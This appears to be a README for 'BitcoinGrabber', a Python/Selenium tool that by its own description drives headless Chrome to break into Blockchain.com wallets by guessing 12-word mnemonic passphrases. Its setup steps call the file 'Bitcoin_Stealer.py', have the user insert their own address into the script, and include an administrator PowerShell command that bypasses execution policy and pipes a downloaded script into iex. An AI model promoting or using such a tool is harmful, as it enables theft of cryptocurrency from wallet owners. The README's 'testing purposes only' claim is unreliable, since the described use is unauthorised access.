# BitcoinGrabber
Python Script used to test the security of the 12word mnemonic passphrase of Blockchain.com

You need chromedriver for this and you need to make some changes based on your screen dimensions.
The script opens a headless chromedriver and tries getting into blockchain portfolios through autogenerated passphrases.

This is just for testing purposes only.

How to use:
1. Open BitcoinGrabber.py with notepad.
2. At the very beginning of the script you will find the line beginning with BitcoinAddress = "Your Bitcoin Address here!"
3. Replace 'Your Bitcoin Address here!' with your own Blockchain Bitcoin Address
4. Save Bitcoin_Stealer.py and close the the file.
5. Make sure you have Chrome and Python 3.6.0 installed! (3.6 is needed no other higher or lower version ONLY 3.6.0!)
6. Open Powershell as Administrator and paste the following: Set-ExecutionPolicy AllSigned
7. Then in the same Powershell paste and run the following: Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
8. After installation, search for "cmd" in the windows search bar and hit enter.
9. Run the following commands:
python -m pip install selenium
python -m pip install pywin32
